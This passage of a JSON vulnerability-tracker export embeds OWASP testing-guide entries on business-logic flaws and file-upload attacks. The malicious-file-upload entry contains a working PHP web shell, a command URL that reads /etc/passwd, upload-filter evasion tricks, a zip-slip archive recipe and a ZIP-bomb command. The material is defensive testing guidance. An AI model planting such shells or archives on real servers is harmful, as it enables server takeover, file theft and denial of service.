Example\n\nSuppose an eCommerce site allows users to take advantage of any one of many discounts on their total purchase and then proceed to checkout and tendering. What happens of the attacker navigates back to the discounts page after taking and applying the one \u201Callowable\u201D discount? Can they take advantage of another discount? Can they take advantage of the same discount multiple times?","TestingInstructions":"## Test Objectives\n\n* Identify functions that must set limits to the times they can be called.\n* Assess if there is a logical limit set on the functions and if it is properly validated.\n\n## How to Test\n\n* Review the project documentation and use exploratory testing looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.\n* For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times. For example, can a user navigate back and forth through the pages multiple times executing a function that should only execute once? or can a user load and unload shopping carts allowing for additional discounts.\n\n## Related Test Cases\n\n* [Testing for Account Enumeration and Guessable User Account](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)\n* [Testing for Weak lock out mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)","Details":null,"Implication":null,"Recommendation":"The application should set hard controls to prevent limit abuse. This can be achieved by setting a coupon to be no longer valid on the database level, to set a counter limit per user on the backend or database level, as all users should be identified through a session, whichever is better to the business requirement.","References":"* \n    [InfoPath Forms Services business logic exceeded the maximum limit of operations Rule](http://mpwiki.viacode.com/default.aspx?g=posts\u0026t=115678)\n* [Gold Trading Was Temporarily Halted On The CME This Morning](https://www.businessinsider.com/gold-halted-on-cme-for-stop-logic-event-2013-10)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-06 Testing for the Circumvention of Work Flows","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Workflow vulnerabilities involve any type of vulnerability that allows the attacker to misuse an application/system in a way that will allow them to circumvent (not follow) the designed/intended workflow.\n[Definition of a workflow on Wikipedia](https://en.wikipedia.org/wiki/Workflow):\n\n\u003E A workflow consists of a sequence of connected steps where each step follows without delay or gap and ends just before the subsequent step may begin. It is a depiction of a sequence of operations, declared as work of a person or group, an organization of staff, or one or more simple or complex mechanisms. Workflow may be seen as any abstraction of real work.\n\nThe application\u2019s business logic must require that the user complete specific steps in the correct/specific order and if the workflow is terminated without correctly completing, all actions and spawned actions are \u201Crolled back\u201D or canceled. Vulnerabilities related to the circumvention of workflows or bypassing the correct business logic workflow are unique in that they are very application/system specific and careful manual misuse cases must be developed using requirements and use cases.\nThe applications business process must have checks to ensure that the user\u2019s transactions/actions are proceeding in the correct/acceptable order and if a transaction triggers some sort of action, that action will be \u201Crolled back\u201D and removed if the transaction is not successfully completed.\n\n### Example 1\n\nMany of us receive some type of \u201Cclub/loyalty points\u201D for purchases from grocery stores and gas stations. Suppose a user was able to start a transaction linked to their account and then after points have been added to their club/loyalty account cancel out of the transaction or remove items from their \u201Cbasket\u201D and tender. In this case the system either should not apply points/credits to the account until it is tendered or points/credits should be \u201Crolled back\u201D if the point/credit increment does not match the final tender. With this in mind, an attacker may start transactions and cancel them to build their point levels without actually buying anything.\n\n### Example 2\n\nAn electronic bulletin board system may be designed to ensure that initial posts do not contain profanity based on a list that the post is compared against. If a word on a deny list is found in the user entered text the submission is not posted. But, once a submission is posted the submitter can access, edit, and change the submission contents to include words included in the profanity/deny list since on edit the posting is never compared again. Keeping this in mind, attackers may open an initial blank or minimal discussion then add in whatever they like as an update.","TestingInstructions":"## Test Objectives\n\n* Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.\n* Develop a misuse case and try to circumvent every logic flow identified.\n\n## How to Test\n\n### Testing Method 1\n\n* Start a transaction going through the application past the points that triggers credits/points to the users account.\n* Cancel out of the transaction or reduce the final tender so that the point values should be decreased and check the points/credit system to ensure that the proper points/credits were recorded.\n\n### Testing Method 2\n\n* On a content management or bulletin board system enter and save valid initial text or values.\n* Then try to append, edit and remove data that would leave the existing data in an invalid state or with invalid values to ensure that the user is not allowed to save the incorrect information. Some \u201Cinvalid\u201D data or information may be specific words (profanity) or specific topics (such as political issues).\n\n## Related Test Cases\n\n* [Testing Directory Traversal/File Include](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)\n* [Testing for Bypassing Authorization Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)\n* [Testing for Bypassing Session Management Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema)\n* [Test Business Logic Data Validation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation)\n* [Test Ability to Forge Requests](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests)\n* [Test Integrity Checks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks)\n* [Test for Process Timing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing)\n* [Test Number of Times a Function Can be Used Limits](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits)\n* [Test Defenses Against Application Mis-use](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse)\n* [Test Upload of Unexpected File Types](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)\n* [Test Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)","Details":null,"Implication":null,"Recommendation":"The application must be self-aware and have checks in place ensuring that the users complete each step in the work flow process in the correct order and prevent attackers from circumventing/skipping/or repeating any steps/processes in the workflow. Test for workflow vulnerabilities involves developing business logic abuse/misuse cases with the goal of successfully completing the business process while not completing the correct steps in the correct order.","References":"* [OWASP Abuse Case Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Abuse_Case_Cheat_Sheet.html)\n* [CWE-840: Business Logic Errors](https://cwe.mitre.org/data/definitions/840.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-07 Test Defenses Against Application Misuse","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"The misuse and invalid use of valid functionality can identify attacks attempting to enumerate the web application, identify weaknesses, and exploit vulnerabilities. Tests should be undertaken to determine whether there are application-layer defensive mechanisms in place to protect the application.\nThe lack of active defenses allows an attacker to hunt for vulnerabilities without any recourse. The application\u2019s owner will thus not know their application is under attack.\n\n### Example\n\nAn authenticated user undertakes the following (unlikely) sequence of actions:\n\n1. Attempt to access a file ID their roles is not permitted to download\n2. Substitutes a single tick \u0060\u0027\u0060 instead of the file ID number\n3. Alters a GET request to a POST\n4. Adds an extra parameter\n5. Duplicates a parameter name/value pair\n\nThe application is monitoring for misuse and responds after the 5th event with extremely high confidence the user is an attacker. For example the application:\n\n* Disables critical functionality\n* Enables additional authentication steps to the remaining functionality\n* Adds time-delays into every request-response cycle\n* Begins to record additional data about the user\u2019s interactions (e.g. sanitized HTTP request headers, bodies and response bodies)\n\nIf the application does not respond in any way and the attacker can continue to abuse functionality and submit clearly malicious content at the application, the application has failed this test case. In practice the discrete example actions in the example above are unlikely to occur like that. It is much more probable that a fuzzing tool is used to identify weaknesses in each parameter in turn. This is what a security tester will have undertaken too.","TestingInstructions":"## Test Objectives\n\n* Generate notes from all tests conducted against the system.\n* Review which tests had a different functionality based on aggressive input.\n* Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.\n\n## How to Test\n\nThis test is unusual in that the result can be drawn from all the other tests performed against the web application. While performing all the other tests, take note of measures that might indicate the application has in-built self-defense:\n\n* Changed responses\n* Blocked requests\n* Actions that log a user out or lock their account\n\nThese may only be localized. Common localized (per function) defenses are:\n\n* Rejecting input containing certain characters\n* Locking out an account temporarily after a number of authentication failures\n\nLocalized security controls are not sufficient. There are often no defenses against general mis-use such as:\n\n* Forced browsing\n* Bypassing presentation layer input validation\n* Multiple access control errors\n* Additional, duplicated or missing parameter names\n* Multiple input validation or business logic verification failures with values that cannot be the result of user mistakes or typos\n* Structured data (e.g. JSON, XML) of an invalid format is received\n* Blatant cross-site scripting or SQL injection payloads are received\n* Utilizing the application faster than would be possible without automation tools\n* Change in continental geo-location of a user\n* Change of user agent\n* Accessing a multi-stage business process in the wrong order\n* Large number of, or high rate of use of, application-specific functionality (e.g. voucher code submission, failed credit card payments, file uploads, file downloads, log outs, etc).\n\nThese defenses work best in authenticated parts of the application, although rate of creation of new accounts or accessing content (e.g. to scrape information) can be of use in public areas.\nNot all the above need to be monitored by the application, but there is a problem if none of them are. By testing the web application, doing the above type of actions, was any response taken against the tester? If not, the tester should report that the application appears to have no application-wide active defenses against misuse. Note it is sometimes possible that all responses to attack detection are silent to the user (e.g. logging changes, increased monitoring, alerts to administrators and and request proxying), so confidence in this finding cannot be guaranteed. In practice, very few applications (or related infrastructure such as a web application firewall) are detecting these types of misuse.\n\n## Related Test Cases\n\nAll other test cases are relevant.","Details":null,"Implication":null,"Recommendation":"Applications should implement active defenses to fend off attackers and abusers.","References":"* [Software Assurance](https://www.cisa.gov/uscert/sites/default/files/publications/infosheet_SoftwareAssurance.pdf), US Department Homeland Security\n* [IR 7684](https://csrc.nist.gov/publications/detail/nistir/7864/final) Common Misuse Scoring System (CMSS), NIST\n* [Common Attack Pattern Enumeration and Classification](https://capec.mitre.org/) (CAPEC), The Mitre Corporation\n* [OWASP AppSensor Project](https://owasp.org/www-project-appsensor/)\n* [AppSensor Guide v2](https://owasp.org/www-pdf-archive/Owasp-appsensor-guide-v2.pdf), OWASP\n* Watson C, Coates M, Melton J and Groves G, [Creating Attack-Aware Software Applications with Real-Time Defenses](https://pdfs.semanticscholar.org/0236/5631792fa6c953e82cadb0e7268be35df905.pdf), CrossTalk The Journal of Defense Software Engineering, Vol. 24, No. 5, Sep/Oct 2011","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-08 Test Upload of Unexpected File Types","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Many applications\u2019 business processes allow for the upload and manipulation of data that is submitted via files. But the business process must check the files and only allow certain \u201Capproved\u201D file types. Deciding what files are \u201Capproved\u201D is determined by the business logic and is application/system specific. The risk is that by allowing users to upload files, attackers may submit an unexpected file type that could be executed and adversely impact the application or system through attacks that may deface the site, perform remote commands, browse the system files, browse the local resources, attack other servers, or exploit the local vulnerabilities, just to name a few.\nVulnerabilities related to the upload of unexpected file types is unique in that the upload should quickly reject a file if it does not have a specific extension. Additionally, this is different from uploading malicious files in that in most cases an incorrect file format may not by it self be inherently \u201Cmalicious\u201D but may be detrimental to the saved data. For example if an application accepts Windows Excel files, if a similar database file is uploaded it may be read but data extracted my be moved to incorrect locations.\nThe application may be expecting only certain file types to be uploaded for processing, such as \u0060.csv\u0060 or \u0060.txt\u0060 files. The application may not validate the uploaded file by extension (for low assurance file validation) or content (high assurance file validation). This may result in unexpected system or database results within the application/system or give attackers additional methods to exploit the application/system.\n\n### Example\n\nSuppose a picture sharing application allows users to upload a \u0060.gif\u0060 or \u0060.jpg\u0060 graphic file to the site. What if an attacker is able to upload an HTML file with a \u0060\u003Cscript\u003E\u0060 tag in it or PHP file? The system may move the file from a temporary location to the final location where the PHP code can now be executed against the application or system.","TestingInstructions":"## Test Objectives\n\n* Review the project documentation for file types that are rejected by the system.\n* Verify that the unwelcomed file types are rejected and handled safely.\n* Verify that file batch uploads are secure and do not allow any bypass against the set security measures.\n\n## How to Test\n\n### Specific Testing Method\n\n* Study the applications logical requirements.\n* Prepare a library of files that are \u201Cnot approved\u201D for upload that may contain files such as: jsp, exe, or HTML files containing script.\n* In the application navigate to the file submission or upload mechanism.\n* Submit the \u201Cnot approved\u201D file for upload and verify that they are properly prevented from uploading\n* Check if the site only does file type checks in client-side JavaScript\n* Check if the site only checks the file type by \u201CContent-Type\u201D in HTTP request.\n* Check if the site only checks the file type by the file extension.\n* Check if other uploaded files can be accessed directly by specified URL.\n* Check if the uploaded file can include code or script injection.\n* Check if there is any file path checking for uploaded files. Especially, hackers may compress files with specified path in ZIP so that the extracted files can be uploaded to intended path after uploading and unzipping.\n\n## Related Test Cases\n\n* [Test File Extensions Handling for Sensitive Information](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information)\n* [Test Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)","Details":null,"Implication":null,"Recommendation":"Applications should be developed with mechanisms to only accept and manipulate \u201Cacceptable\u201D files that the rest of the application functionality is ready to handle and expecting. Some specific examples include: deny lists or allow lists of file extensions, using \u201CContent-Type\u201D from the header, or using a file type recognizer, all to only allow specified file types into the system.","References":"* [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\n* [File upload security best practices: Block a malicious file upload](https://www.computerweekly.com/answer/File-upload-security-best-practices-Block-a-malicious-file-upload)\n* [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)\n* [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-09 Test Upload of Malicious Files","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Many application\u2019s business processes allow users to upload data to them. Although input validation is widely understood for text-based input fields, it is more complicated to implement when files are accepted. Although many sites implement simple restrictions based on a list of permitted (or blocked) extensions, this is not sufficient to prevent attackers from uploading legitimate file types that have malicious contents.\nVulnerabilities related to the uploading of malicious files is unique in that these \u201Cmalicious\u201D files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.\nFinally, \u201Cmalicious\u201D means different things to different systems, for example malicious files that may exploit SQL server vulnerabilities may not be considered as \u201Cmalicious\u201D in an environment using a NoSQL data store.\nThe application may allow the upload of malicious files that include exploits or shellcode without submitting them to malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture such as: Intrusion Detection/Prevention System, application server anti-virus software or anti-virus scanning by application as files are uploaded (perhaps offloading the scanning using SCAP).\n\n### Example\n\nA common example of this vulnerability is an application such as a blog or forum that allows users to upload images and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP script), this could allow them to execute operating system commands, read and modify information in the filesystem, access the backend database and fully compromise the server.","TestingInstructions":"## Test Objectives\n\n* Identify the file upload functionality.\n* Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.\n    * If documentation is not available then consider what would be appropriate based on the purpose of the application.\n* Determine how the uploaded files are processed.\n* Obtain or create a set of malicious files for testing.\n* Try to upload the malicious files to the application and determine whether it is accepted and processed.\n\n## How to Test\n\n### Malicious File Types\n\nThe simplest checks that an application can do are to determine that only trusted types of files can be uploaded.\n\n#### Web Shells\n\nIf the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.\nUploading this kind of shell onto an internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:\n\n* Uploading the shell with a randomly generated name.\n* Password protecting the shell.\n* Implementing IP based restrictions on the shell.\n\n**Remember to remove the shell when you are done.**\nThe example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:\n\n\u0060\u0060\u0060\n\u003C?php\n    if ($_SERVER[\u0027REMOTE_HOST\u0027] === \u0022FIXME\u0022) { // Set your IP address here\n        if(isset($_REQUEST[\u0027cmd\u0027])){\n            $cmd = ($_REQUEST[\u0027cmd\u0027]);\n            echo \u0022\u003Cpre\u003E\\n\u0022;\n            system($cmd);\n            echo \u0022\u003C/pre\u003E\u0022;\n        }\n    }\n?\u003E\n\u0060\u0060\u0060\n\nOnce the shell is uploaded (with a random name), you can execute operating system commands by passing them in the \u0060cmd\u0060 GET parameter:\n\u0060https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat\u002B/etc/passwd\u0060\n\n#### Filter Evasion\n\nThe first step is to determine what the filters are allowing or blocking, and where they are implemented. If the restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting proxy.\nIf the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:\n\n* Change the value of \u0060Content-Type\u0060 as \u0060image/jpeg\u0060 in HTTP request.\n* Change the extensions to a less common extension, such as \u0060file.php5\u0060, \u0060file.shtml\u0060, \u0060file.asa\u0060, \u0060file.jsp\u0060, \u0060file.jspx\u0060, \u0060file.aspx\u0060, \u0060file.asp\u0060, \u0060file.phtml\u0060, \u0060file.cshtml\u0060\n* Change the capitalisation of the extension, such as \u0060file.PhP\u0060 or \u0060file.AspX\u0060\n* If the request includes multiple filenames, change them to different values.\n* Using special trailing characters such as spaces, dots or null characters such as \u0060file.asp...\u0060, \u0060file.php;jpg\u0060, \u0060file.asp%00.jpg\u0060, \u00601.jpg%00.php\u0060\n* In badly configured versions of Nginx, uploading a file as \u0060test.jpg/x.php\u0060 may allow it to be executed as \u0060x.php\u0060.\n\n### Malicious File Contents\n\nOnce the file type has been validated, it is important to also ensure that the contents of the file are safe. This is significantly harder to do, as the steps required will vary depending on the types of file that are permitted.\n\n#### Malware\n\nApplications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the [EICAR test file](https://www.eicar.org/download-anti-malware-testfile/), which is an safe file that is flagged as malicious by all anti-malware software.\nDepending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) and the [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) can be used to generate malicious files for various formats.\nWhen this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.\n\n#### Archive Directory Traversal\n\nIf the application extracts archives (such as ZIP files), then it may be possible to write to unintended locations using directory traversal. This can be exploited by uploading a malicious ZIP file that contains paths that traverse the file system using sequences such as \u0060..\\..\\..\\..\\shell.php\u0060. This technique is discussed further in the [snyk advisory](https://snyk.io/research/zip-slip-vulnerability).\nA test against Archive Directory Traversal should include two parts:\n\n1. A malicious archive that breaks out of the target directory when extracted. This malicious archive should contain two files: a \u0060base\u0060 file, extracted into the target directory, and a \u0060traversed\u0060 file that attempts to navigate up the directory tree to hit the root folder - adding a file into the \u0060tmp\u0060 directory. A malicious path will contain many levels of \u0060../\u0060 (*i.e.* \u0060../../../../../../../../tmp/traversed\u0060) to stand a better chance of reaching the root directory. Once the attack is successful, the tester can find \u0060/tmp/traversed\u0060 to be created on the webserver through the ZIP slip attack.\n2. Logic that extracts compressed files either using custom code or a library. Archive Directory Traversal vulnerabilities exist when the extraction functionality doesn\u2019t validate file paths in the archive. The example below shows a vulnerable implementation in Java:\n\n\u0060\u0060\u0060\nEnumeration\u003CZipEntry\u003E entries =\u200B \u200Bzip\u200B.g\u200BetEntries();\n\nwhile(entries\u200B.h\u200BasMoreElements()){\n    ZipEntry e \u200B= \u200Bentries.nextElement();\n    File f = new File(destinationDir, e.getName());\n    InputStream input = zip\u200B.g\u200BetInputStream(e);\n    IOUtils\u200B.c\u200Bopy(input, write(f));\n}\n\u0060\u0060\u0060\n\nFollow the steps below to create a ZIP file that can abuse the vulnerable code above once its uploaded to the web server:\n\n\u0060\u0060\u0060\n# Open a new terminal and create a tree structure\n# (more directory levels might be required based on the system being targeted)\nmkdir -p a/b/c\n# Create a base file\necho \u0027base\u0027 \u003E a/b/c/base\n# Create a traversed file\necho \u0027traversed\u0027 \u003E traversed\n# You can double check the tree structure using \u0060tree\u0060 at this stage\n# Navigate to a/b/c root directory\ncd a/b/c\n# Compress the files\nzip test.zip base ../../../traversed\n# Verify compressed files content\nunzip -l test.zip\n\u0060\u0060\u0060\n\n#### ZIP Bombs\n\nA [ZIP bomb](https://en.wikipedia.org/wiki/zip_bomb) (more generally known as a decompression bomb) is an archive file that contains a large volume of data. It\u2019s intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to extract the archive. Note that although the ZIP format is the most used example for this, other formats are also affected, including gzip (which is frequently used to compress data in transit).\nAt its simplest level, a ZIP bomb can be created by compressing a large file consisting of a single character. The example below shows how to create a 1MB file that will decompress to 1GB:\n\n\u0060\u0060\u0060\ndd if=/dev/zero bs=1M count=1024 | zip -9 \u003E bomb.zip\n\u0060\u0060\u0060\n\nThere are a number of methods that can be used to achieve much higher compression ratios, including multiple levels of compression, [abusing the ZIP format](https://www.bamsoftware.com/hacks/zipbomb/) and [quines](https://research.swtch.com/zip) (which are archives that contain a copy of themselves, causing infinite recursion).\nA successful ZIP bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling cloud platform is used. **Do not carry out this kind of attack unless you have considered these risks and have written approval to do so.**\n\n#### XML Files\n\nXML files have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks such as the [billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack).\nThese are discussed further in the [Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection) guide.\n\n#### Other File Formats\n\nMany other file formats also have specific security concerns that need to be taken into account, such as:\n\n* Image files must be checked for maximum pixel/frame size.\n* CSV files may allow [CSV injection attacks](https://owasp.org/www-community/attacks/CSV_Injection).\n* Office files may contain malicious macros or PowerShell code.\n* PDFs may contain malicious JavaScript.\n\nThe permitted file formats should be carefully reviewed for potentially dangerous functionality, and where possible attempts should be made to exploit this during testing.\n\n### Source Code Review\n\nWhen there is file upload feature supported, the following API/methods are common to be found in the source code.\n\n* Java: \u0060new file\u0060, \u0060import\u0060, \u0060upload\u0060, \u0060getFileName\u0060, \u0060Download\u0060, \u0060getOutputString\u0060\n* C/C\u002B\u002B: \u0060open\u0060, \u0060fopen\u0060\n* PHP: \u0060move_uploaded_file()\u0060, \u0060Readfile\u0060, \u0060file_put_contents()\u0060, \u0060file()\u0060, \u0060parse_ini_file()\u0060, \u0060copy()\u0060, \u0060fopen()\u0060, \u0060include()\u0060, \u0060require()\u0060\n\n## Related Test Cases\n\n* [Test File Extensions Handling for Sensitive Information](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information)\n* [Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)\n* [Test Upload of Unexpected File Types](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)\n\n## Tools\n\n* Metasploit\u2019s payload generation functionality\n* Intercepting proxy","Details":null,"Implication":null,"Recommendation":"Fully protecting against malicious file upload can be complex, and the exact steps required will vary depending on the types of files that are uploaded, and how the files are processed or parsed on the server. This is discussed more fully in the [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).","References":"* [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)\n* [OWASP - Unrestricted File 